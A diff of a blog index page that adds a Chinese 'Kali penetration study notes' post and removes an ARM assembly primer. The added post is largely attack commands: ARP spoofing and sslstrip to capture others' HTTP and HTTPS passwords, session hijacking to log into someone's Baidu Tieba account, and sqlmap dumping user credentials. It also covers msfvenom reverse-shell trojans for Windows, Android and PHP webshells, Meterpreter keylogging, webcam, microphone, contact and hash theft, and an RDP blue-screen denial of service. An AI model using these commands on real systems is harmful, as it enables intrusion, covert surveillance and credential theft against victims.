@@ -150,6 +150,231 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Kali渗透学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/21/Kali渗透学习笔记/">Kali渗透学习笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/21/Kali渗透学习笔记/" class="archive-article-date">
+  	<time datetime="2018-09-21T02:11:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Kali渗透测试"><a href="#Kali渗透测试" class="headerlink" title="Kali渗透测试"></a>Kali渗透测试</h3><ul>
+<li><p>Xshell连接</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启SSH链接</span><br><span class="line">kali中进入命令行模式 alt+ctrl+f1=&gt; /etc/init.d/ssh start</span><br><span class="line">Xshell链接 ：输入kali的ip，root账户密码即可</span><br><span class="line">kali后台运行</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>arp攻击：</p>
+<ul>
+<li>目标的ip流量经过我的网卡</li>
+<li><code>arpspoof  -i 网卡 -t 目标IP 网关</code></li>
+<li>查看局域网ip <code>Fping -asg 192.168.1.0/24</code></li>
+<li>IP流量转发： <code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code> 就不会出现断网</li>
+</ul>
+</li>
+<li><p>arp欺骗</p>
+<ul>
+<li><p>目标的ip流量经过我的网卡，从网关出去</p>
+</li>
+<li><p>先进行arp欺骗</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof  -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>driftnet  -&gt;获取本机网卡的流量信息</p>
+<ul>
+<li><code>driftnet -i 网卡</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>http账户密码获取</p>
+<ul>
+<li><code>Ettercap</code>：欺骗，DNS欺骗，流量嗅探</li>
+<li>先进行arp欺骗</li>
+<li><code>ettercap -Tq -i 网卡</code> 启动文本模式和安静模式 嗅探流量</li>
+</ul>
+</li>
+<li><p>https账户密码获取</p>
+<ul>
+<li><code>sslstrip</code>工具 将https链接还原为HTTP</li>
+<li><code>vim /etc/ettercap/etter.conf</code>  删除<code>if you use iptables：</code>底下的2个#注释</li>
+<li>先进行 <code>sslstrip -a -f -k</code></li>
+<li>再进行arp欺骗</li>
+<li>最后嗅探 ettercap</li>
+<li>缺点：https容易出现证书错误</li>
+</ul>
+</li>
+<li><p>会话截取-登录别人的百度贴吧</p>
+<ul>
+<li>方法一：<ul>
+<li><code>arpspoof + wireshark+ferret（重新生成抓包后的文件）+hamster（重放流量）</code></li>
+<li>先 arp欺骗</li>
+<li>wireshark抓包：增加本地网卡，等刷新后，保存xxx.pcap文件</li>
+<li><code>ferret -r xxx.pcap</code>   生成<code>hamster.txt</code>文件</li>
+<li>将hamster.txt文件拷贝到/root/目录</li>
+<li><code>hamster</code> 命令，安装要求打开浏览器设置代理及端口，可以看到欺骗的ip</li>
+<li>寻找重放的页面</li>
+</ul>
+</li>
+<li>方法二：<ul>
+<li>不需要欺骗</li>
+<li><code>ferret -i 网卡</code>   浏览器设置端口</li>
+<li><code>hamster</code>  浏览器设置端口1234</li>
+<li>实时重放页面可挟持</li>
+</ul>
+</li>
+<li>方法三：<ul>
+<li>一键劫持软件：CookieCadger-jar </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>SQLMAP及ASP网站渗透</p>
+<ul>
+<li>asp网站 大多数用的Access和MSSQL</li>
+<li><code>sqlmap -u &quot;URL&quot;</code>:检测是否存在注入，返回数据库的名字</li>
+<li><code>sqlmap -u &quot;URL&quot; --tables</code> 猜解所有的表名</li>
+<li><code>sqlmap -u &quot;URL&quot; --columns -T &quot;tables名字&quot;</code>  猜列名</li>
+<li><code>sqlmap -u &quot;URL&quot; --dump -C &quot;username,password&quot; -T &quot;tables的名字&quot;</code>  –dump下载数据</li>
+</ul>
+</li>
+<li><p>SQLMAP及PHP网站渗透</p>
+<ul>
+<li>php网站大多数是mysql</li>
+<li><code>sqlmap -u &quot;URL&quot;</code>:检测是否有注入</li>
+<li><code>sqlmap -u &quot;URL&quot; --is-dba</code>  ：是否能遍历,目录文件写文件</li>
+<li><code>sqlmap -u &quot;URL&quot; --dbs</code> 列出所有数据库</li>
+<li><code>sqlmap -u &quot;URL&quot; --current-db</code> 查找自己当前使用的数据库</li>
+<li><code>sqlmap -u &quot;URL&quot; --tables -D &quot;数据库名&quot;</code> 根据数据来猜解所有的表名</li>
+<li><code>sqlmap -u &quot;URL&quot; --columns -T &quot;表名&quot; -D &quot;数据库名&quot;</code> 查询所有的列</li>
+<li><code>sqlmap -u &quot;URL&quot; --dump -C &quot;username,password&quot; -T &quot;表名&quot; -D &quot;数据库名&quot;</code> 查询列的字段</li>
+</ul>
+</li>
+<li><p>SQLMAP及Cookie注入</p>
+<ul>
+<li><code>sqlmap -u &quot;URL&quot;  --cookie &quot;id参数&quot; --level 2</code> &lt;不需要？及id=？，以asp等结尾的URL&gt; 、cookie注入，就要把等级提升为level 2</li>
+</ul>
+</li>
+<li><p>Metasploit</p>
+<ul>
+<li>启动<code>msfconsole</code></li>
+<li>Exploit模块=&gt;漏洞利用，Payloads=&gt;-hellcode 漏洞利用后执行的代码</li>
+<li>使用 <ul>
+<li><code>use exploit/windows/smb/ms08_067_netapi</code>选择漏洞利用模块</li>
+<li><code>show options</code> 查看要填入的参数</li>
+<li><code>set RHOST ....</code></li>
+<li><code>set PAYLOAD xx/xx/xx</code></li>
+<li><code>show options</code></li>
+<li><code>exploit</code> 执行</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Metasploit远程控制软件</p>
+<ul>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.根据自己的ip生成一个木马/msfvenom</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx1 LPROT=xx2 -f exe &gt; xx.exe</span><br><span class="line">2.使用handler模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">使用shellcode选项</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">查看选项</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> LHOST xx1</span><br><span class="line"><span class="built_in">set</span> LPROT xx2</span><br><span class="line">3.exploit</span><br><span class="line">等待对方点击xx.exe木马文件</span><br><span class="line">4.sysinfo/shell等命令</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#木马常用功能：</span></span><br><span class="line">1.backgroud &lt;会话切换&gt;</span><br><span class="line">  session -l 查看session进程</span><br><span class="line">  session -i x 选择session进程</span><br><span class="line">******注入进程重要**********</span><br><span class="line">2.ps得到我们要注入的pid进程</span><br><span class="line">  migrate xxx：注入进程</span><br><span class="line">3.run vnc  ：开启远程桌面</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件管理功能</span></span><br><span class="line">download 下载文件</span><br><span class="line">edit	 编辑文件</span><br><span class="line">cat		 查看文件</span><br><span class="line">mkdir	 创建文件夹</span><br><span class="line">mv		 移动文件</span><br><span class="line">rm		 删除文件</span><br><span class="line">upload	 上传文件</span><br><span class="line">rmdir    删除文件夹</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#网络及系统操作</span></span><br><span class="line">arp			看ARP缓冲表</span><br><span class="line">ifconfig	IP地址网卡</span><br><span class="line">getproxy	获取代理</span><br><span class="line">netstat		查看端口链接</span><br><span class="line"><span class="built_in">kill</span>		结束进程</span><br><span class="line">ps			查看进程</span><br><span class="line">reg			修改注册表</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用户接口</span></span><br><span class="line">enumdesktop		窗体列表</span><br><span class="line">keyscam_dump	键盘记录下载</span><br><span class="line">keyscan_strat	键盘记录开始</span><br><span class="line">keyscan_stop	键盘记录停止</span><br><span class="line">uictl			获取键盘鼠标控制权 -h 查看选项</span><br><span class="line">record_mic		音频录制</span><br><span class="line">webcam_chat		查看摄像头接口</span><br><span class="line">webcam_list		查看摄像头列表</span><br><span class="line">webcam_stream	摄像头视频获取</span><br><span class="line">getsystem		获取高权限</span><br><span class="line">hashdump		下载<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>Android渗透测试</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.生成apk</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=xx1 LPROT=xx2 -f apk &gt; xxx.apk</span><br><span class="line">生成apk文件</span><br><span class="line">2.使用handler模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">使用shellcode选项</span><br><span class="line">set PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line">3.查看选项</span><br><span class="line">show options</span><br><span class="line">set LHOST xx1</span><br><span class="line">set LPROT xx2</span><br><span class="line">4.exploit</span><br><span class="line">5.手机安装apk文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search</span><br><span class="line">download</span><br><span class="line">ps 	查看qq进程</span><br><span class="line">webcam_snap 截屏</span><br><span class="line">webcam_stream -i 1/2 开启摄像头</span><br><span class="line">check_root	检测ROOT</span><br><span class="line">dump_calllog 下载电话记录</span><br><span class="line">dump_contact 下载联系人记录</span><br><span class="line">Geolocate	定位</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>Metasploit服务器蓝屏</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务器开启3389</span><br><span class="line">确定服务器ip</span><br><span class="line">auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">服务器远程桌面的一个利用模块</span><br><span class="line">auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">扫描主机是否存在漏洞</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. msfconsole</span><br><span class="line">2. search ms12_020</span><br><span class="line">3. use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">4. show options</span><br><span class="line">5. set RHOST xx.xx.xx.xx</span><br><span class="line">6. exploit 确定了xx.xx.xx.xx：3389存在</span><br><span class="line">7. user auxiliary/dos/windows/rdp/ms12_020_check</span><br><span class="line">8. show options</span><br><span class="line">9. set RHOST xx.xx.xx.xx</span><br><span class="line">10. exploit</span><br><span class="line">11. 蓝屏攻击成功</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>Metasploit 生成webshell及应用</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.msf生成一个php脚本</span><br><span class="line">msfpayload php/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx R &gt; web.php</span><br><span class="line">2.上传php脚本到网站上</span><br><span class="line">3.user exploit/multu/handler</span><br><span class="line">4.show options</span><br><span class="line">5. set LHost</span><br><span class="line">6.exploit</span><br><span class="line">7.访问web.php</span><br><span class="line">8.反弹出了会话</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/21/Kali渗透学习笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CVE-2012-6422" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -962,317 +1187,9 @@
 
 
   
-    <article id="post-Hello-ARM" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/22/Hello-ARM/">Hello ARM</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/22/Hello-ARM/" class="archive-article-date">
-  	<time datetime="2018-08-22T07:49:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Hello-ARM"><a href="#Hello-ARM" class="headerlink" title="Hello ARM"></a>Hello ARM</h2><p><strong>这是一篇ARM基本简介与指令介绍集合~</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello ARM!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拖入IDA pro=对应main入口处</span></span><br><span class="line">                 EXPORT main						<span class="comment">//表明这个main函数是被程序导出</span></span><br><span class="line">.text:<span class="number">000082E0</span> main         ; CODE XREF: j_mainj</span><br><span class="line">.text:<span class="number">000082E0</span></span><br><span class="line">.text:<span class="number">000082E0</span> var_C  = <span class="number">-0xC</span>						<span class="comment">//栈变量</span></span><br><span class="line">.text:<span class="number">000082E0</span> var_8  = <span class="number">-8</span>							<span class="comment">//栈变量</span></span><br><span class="line">.text:<span class="number">000082E0</span>							</span><br><span class="line">.text:<span class="number">000082E0</span>  STMFD   SP!, &#123;R11,LR&#125;				<span class="comment">//把寄存器的值压入堆栈</span></span><br><span class="line">.text:<span class="number">000082E4</span>  ADD     R11, SP, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">000082E8</span>  SUB     SP, SP, #<span class="number">8</span></span><br><span class="line">.text:<span class="number">000082</span>EC  STR     R0, [R11,#var_8]			<span class="comment">//将R0寄存器的值保存到栈变量var_8中</span></span><br><span class="line">.text:<span class="number">000082F</span>0  STR     R1, [R11,#var_C]</span><br><span class="line">.text:<span class="number">000082F</span>4  LDR     R3, =(aHelloArm - <span class="number">0x8300</span>)</span><br><span class="line">.text:<span class="number">000082F</span>8  ADD     R3, PC, R3      ; <span class="string">"Hello ARM!"</span></span><br><span class="line">.text:<span class="number">000082F</span>C  MOV     R0, R3          ; s			<span class="comment">//把R3寄存器的值赋给R0寄存器</span></span><br><span class="line">.text:<span class="number">00008300</span>  BL      <span class="built_in">puts</span>						<span class="comment">//调用puts函数</span></span><br><span class="line">.text:<span class="number">00008304</span>  MOV     R3, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">00008308</span>  SUB     SP, R11, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00008310</span>  LDMFD   SP!, &#123;R11,PC&#125;				<span class="comment">//用于从堆栈中恢复寄存器的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//STMFD与LDMFD是堆栈寻址指令</span></span><br><span class="line"><span class="comment">//STR与LDR是存储器访问指令</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="原生程序生成过程"><a href="#原生程序生成过程" class="headerlink" title="原生程序生成过程"></a>原生程序生成过程</h3><p>原生程序的代码是由Android NDK中提供的交叉编译（跨平台编译）工具链中的gcc编译器来编译的（交叉编译工具链：能在一种平台上编译出另一种平台上运行的程序的工具集合）</p>
-<ul>
-<li>预处理<ul>
-<li>“#include”包含的头文件会全部被编译进来，“#define”预定义、“#if”预条件处理等</li>
-<li><code>gcc -E hello.c -o hello.i</code>(gcc能搜索到Android NDK头文件路径)</li>
-</ul>
-</li>
-<li>编译<ul>
-<li>检查代码的规范性，以及是否有语法错误，gcc编译器把代码翻译成ARM汇编语言的代码</li>
-<li><code>gcc –S hello.i–o hello.s</code></li>
-</ul>
-</li>
-<li>汇编<ul>
-<li>gcc编译器会调用汇编器将汇编代码汇编成二进制目标文件</li>
-<li><code>gcc –c hello.s –o hello.o</code>.</li>
-</ul>
-</li>
-<li>链接<ul>
-<li>调用链接器将二进制的目标文件链接成Android平台可执行的ARM原生程序</li>
-<li><code>gcc hello.o –o hello</code><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#makefile</span></span><br><span class="line">NDK_ROOT=c:/android-ndk-r8 <span class="comment">#路径</span></span><br><span class="line">TOOLCHAINS_ROOT=<span class="variable">$(NDK_ROOT)</span>/toolchains/arm-linux-androideabi-4.4.3/prebuilt/windows</span><br><span class="line">TOOLCHAINS_PREFIX=<span class="variable">$(TOOLCHAINS_ROOT)</span>/bin/arm-linux-androideabi</span><br><span class="line">TOOLCHAINS_INCLUDE=<span class="variable">$(TOOLCHAINS_ROOT)</span>/lib/gcc/arm-linux-androideabi/4.4.3/include-fixed</span><br><span class="line">PLATFORM_ROOT=<span class="variable">$(NDK_ROOT)</span>/platforms/android-14/arch-arm</span><br><span class="line">PLATFORM_INCLUDE=<span class="variable">$(PLATFORM_ROOT)</span>/usr/<span class="keyword">include</span></span><br><span class="line">PLATFORM_LIB=<span class="variable">$(PLATFORM_ROOT)</span>/usr/lib</span><br><span class="line">MODULE_NAME=hello</span><br><span class="line">RM=del</span><br><span class="line">FLAGS=-I<span class="variable">$(TOOLCHAINS_INCLUDE)</span> \</span><br><span class="line">	-I<span class="variable">$(PLATFORM_INCLUDE)</span> \</span><br><span class="line">	-L<span class="variable">$(PLATFORM_LIB)</span> \</span><br><span class="line">	-nostdlib \</span><br><span class="line">	-lgcc \</span><br><span class="line">	-Bdynamic \</span><br><span class="line">	-lc</span><br><span class="line">OBJS=<span class="variable">$(MODULE_NAME)</span>.o \</span><br><span class="line">	<span class="variable">$(PLATFORM_LIB)</span>/crtbegin_dynamic.o \</span><br><span class="line">	<span class="variable">$(PLATFORM_LIB)</span>/crtend_android.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> -c <span class="variable">$(MODULE_NAME)</span>.c -o <span class="variable">$(MODULE_NAME)</span>.o</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> <span class="variable">$(OBJS)</span> -o <span class="variable">$(MODULE_NAME)</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o</span><br><span class="line"><span class="section">install:</span></span><br><span class="line">	adb push <span class="variable">$(MODULE_NAME)</span> /data/local/</span><br><span class="line">	adb shell chmod 755 /data/local/<span class="variable">$(MODULE_NAME)</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><ul>
-<li>ARM微处理器共有37个32位寄存器，其中31个为通用寄存器，6个为状态寄存器</li>
-<li>ARM处理器七种运行模式:2-7为特权模式</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1．用户模式（usr）：ARM处理器正常的程序执行状态。</span><br><span class="line">2．快速中断模式（fiq）：用于高速数据传输或通道处理。</span><br><span class="line">3．外部中断模式（irq）：用于通用的中断处理。</span><br><span class="line">4．管理模式（svc）：操作系统使用的保护模式。</span><br><span class="line">5．数据访问终止模式（abt）：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。</span><br><span class="line">6．系统模式（sys）：运行具有特权的操作系统任务。</span><br><span class="line">7．未定义指令中止模式（und）：当未定义的指令执行时进入该模式。</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>用户模式下，处理器可以访问的寄存器为<u>不分组寄存器R0～R7、分组寄存器R8～R14、程序计数器R15（PC）以及当前程序状态寄存器CPSR</u></p>
-</li>
-<li><p>ARM处理器有两种工作状态：<strong>ARM状态与Thumb状态</strong>，可以在两种状态之间随意切换。</p>
-<ul>
-<li>ARM状态时，执行32位字对齐的ARM指令</li>
-<li>Thumb状态时，执行16位对齐的Thumb指令</li>
-</ul>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//Thumb状态下对寄存器的命名与ARM有部分差异</span><br><span class="line">●　Thumb状态下的R0～R7与ARM状态下的R0～R7相同。</span><br><span class="line">●　Thumb状态下的CPSR与ARM状态下的CPSR相同。</span><br><span class="line">●　Thumb状态下的FP对应于ARM状态下的R11。</span><br><span class="line">●　Thumb状态下的IP对应于ARM状态下的R12。</span><br><span class="line">●　Thumb状态下的SP对应于ARM状态下的R13。</span><br><span class="line">●　Thumb状态下的LR对应于ARM状态下的R14。</span><br><span class="line">●　Thumb状态下的PC对应于ARM状态下R15</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="ARM程序结构"><a href="#ARM程序结构" class="headerlink" title="ARM程序结构"></a>ARM程序结构</h3><p>Android平台的ARM汇编是GNU ARM汇编格式，使用的汇编器（汇编器的功能是将汇编代码转换为二进制目标文件）为GAS（GNU Assembler，GNU汇编器），<a href="http://sourceware.org/binutils/docs/as/index.html" target="_blank" rel="noopener">语法结构在线手册</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">    .arch armv5te            	@处理器架构</span><br><span class="line">    .fpu softvfp             	@浮点协处理器类型 </span><br><span class="line">    .eabi_attribute 20, 1    	@接口属性</span><br><span class="line">    .eabi_attribute 21, 1</span><br><span class="line">    .eabi_attribute 23, 3</span><br><span class="line">    .eabi_attribute 24, 1</span><br><span class="line">    .eabi_attribute 25, 1</span><br><span class="line">    .eabi_attribute 26, 2</span><br><span class="line">    .eabi_attribute 30, 6</span><br><span class="line">    .eabi_attribute 18, 4</span><br><span class="line">    .file   &quot;hello.c&quot;       	@源文件名</span><br><span class="line">    .section    .rodata         @声明只读数据</span><br><span class="line">    .align  2               	@声明对齐方式2^2=4字节</span><br><span class="line">.LC0:                      		@标号LC0</span><br><span class="line">    .ascii  &quot;Hello ARM!\000&quot;	@声明字符串</span><br><span class="line">    .text                    	@声明代码段</span><br><span class="line">    .align  2               	@声明对齐方式4字节</span><br><span class="line">    .global main            	@全局符号main</span><br><span class="line">    .type   main, %function 	@main类型为函数</span><br><span class="line">main:                        	@标号main</span><br><span class="line">    @ args = 0, pretend = 0, frame = 8</span><br><span class="line">    @ frame_needed = 1, uses_anonymous_args = 0</span><br><span class="line">    stmfd   sp!, &#123;fp, lr&#125;   	@将fp，lr压入堆栈</span><br><span class="line">    add fp, sp, #4           	@初始化fp寄存器，设置栈帧，用于访问局部变量</span><br><span class="line">    sub sp, sp, #8           	@开辟栈空间</span><br><span class="line">    str r0, [fp, #-8]        	@保存第一个参数</span><br><span class="line">    str r1, [fp, #-12]      	@保存第二个参数</span><br><span class="line">    ldr r3, .L3              	@取标号.L3处的内容，</span><br><span class="line">.LPIC0:							@标号.LPIC0</span><br><span class="line">    add r3, pc, r3				@计算字符串的内存地址</span><br><span class="line">    mov r0, r3					@设置参数1</span><br><span class="line">    bl  puts(PLT)				@调用puts函数</span><br><span class="line">    mov r3, #0					@设置r3寄存器的值为0</span><br><span class="line">    mov r0, r3					@程序返回结果为0</span><br><span class="line">    sub sp, fp, #4				